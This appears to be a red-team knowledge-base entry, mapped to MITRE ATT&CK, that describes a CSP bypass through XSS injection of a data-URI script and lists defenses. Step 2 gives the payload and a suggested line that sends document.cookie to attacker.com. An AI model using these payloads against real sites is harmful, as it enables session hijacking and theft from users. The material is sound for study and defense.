---
id: 16a8db57-49ad-40d9-ada2-7e9eab594c69
name: CSP-Bypass-via-XSS-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:43.280672+00:00'
updated_at: '2023-04-10T20:21:32.580274+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/JavaScript|T1059.007 - JavaScript]]'
  - >-
    [[techniques/Impair Defenses - Disable or Modify Tools|T1562.001 - Impair
    Defenses: Disable or Modify Tools]]
sub_techniques: []
tags:
  - '[[tags/CSP Bypass]]'
  - '[[tags/Cross Site Scripting]]'
  - >-
    [[tags/Bypass CSP by
    [@404death](https://twitter.com/404death/status/1191222237782659072)]]
commands: []
platforms:
  - Web
tools: []
validated: true
---

# CSP-Bypass-via-XSS-Injection

## Summary

This procedure demonstrates how to bypass a website's Content Security Policy (CSP) by exploiting a Cross-Site Scripting (XSS) vulnerability. By injecting a malicious script using a data URI, the attacker can execute arbitrary JavaScript code despite CSP restrictions on external script sources, enabling actions like stealing user credentials or performing phishing.

## Description

Content Security Policy (CSP) is a browser-enforced security layer that restricts the sources from which scripts, styles, and other resources can load, primarily to mitigate XSS attacks. However, if an XSS vulnerability exists (e.g., unsanitized user input reflected in HTML), an attacker can inject inline scripts or use data URIs to evade 'script-src' directives that block external sources. This procedure targets reflected or stored XSS points, such as search fields or comment sections, to inject a payload that triggers an alert or more malicious behavior. It is effective against weak CSP policies allowing 'self' or data URIs but blocking unsafe-inline or external domains. The attack assumes the target is a web application vulnerable to XSS, and success leads to code execution in the victim's browser context, potentially compromising session tokens or enabling further attacks like keylogging.

## Requirements

1. Identification of an XSS-vulnerable input field on the target website (e.g., via manual testing or tools like Burp Suite).
2. Knowledge of the site's CSP policy (inspect HTTP headers or use browser dev tools to view Content-Security-Policy header).
3. Access to the website as a user (no special privileges needed, but proximity to victim sessions increases impact).
4. A testing environment or proxy to intercept and modify requests (e.g., Burp Suite or browser extensions).

## Defense

- Implement strict input validation and output encoding (e.g., using HTML entity encoding) to prevent XSS injection.
- Enforce a robust CSP policy with 'script-src 'self'' and no 'unsafe-inline' or 'data:' allowances; use nonces or hashes for inline scripts.
- Regularly scan for XSS vulnerabilities using automated tools like OWASP ZAP or manual penetration testing.
- Monitor for anomalous JavaScript execution via client-side logging or Web Application Firewalls (WAFs).

## Objectives

1. Exploit an XSS vulnerability to inject and execute JavaScript code.
2. Bypass CSP restrictions to load or run unauthorized scripts.
3. Demonstrate potential impacts like alerting for proof-of-concept or exfiltrating data in real attacks.
4. Validate the bypass by observing code execution in the victim's browser.

## Instructions

### Step 1: Identify and Test CSP Policy

**Context**: Before injecting, confirm the CSP allows data URIs or has gaps. This step involves inspecting the policy to ensure the bypass vector (data URI) is viable; if 'data:' is blocked, alternative techniques like JSONP or DOM-based XSS may be needed.

Inspect the HTTP response headers or use browser developer tools (F12 > Network tab) to view the Content-Security-Policy header. Look for 'script-src' directives.

**Expected Output**: CSP header like "Content-Security-Policy: script-src 'self' data:;" indicating data URIs are permitted.

### Step 2: Inject XSS Payload to Bypass CSP

**Context**: Locate a reflected XSS point (e.g., a search parameter like ?q=<input>) and inject the payload. The data URI scheme embeds the script directly, evading source restrictions. This executes immediately upon injection if reflected.

Use a proxy or directly submit the payload via the vulnerable input. For example, in a URL parameter: http://target.com/search?q=<script src="data:,alert(1)">/</script>

**Code** ([[codes/CSP-Bypass-XSS-Data-URI-Payload]]):

```javascript
<script src="data:,alert(1)">/</script>
```

> This payload uses a data URI to load inline JavaScript, triggering an alert(1) to confirm execution. Replace alert(1) with malicious code like document.location='http://attacker.com/steal?cookie='+document.cookie for data exfiltration. Expected output: An alert box pops up in the browser, proving bypass success. If no alert, check for stricter CSP or input sanitization.
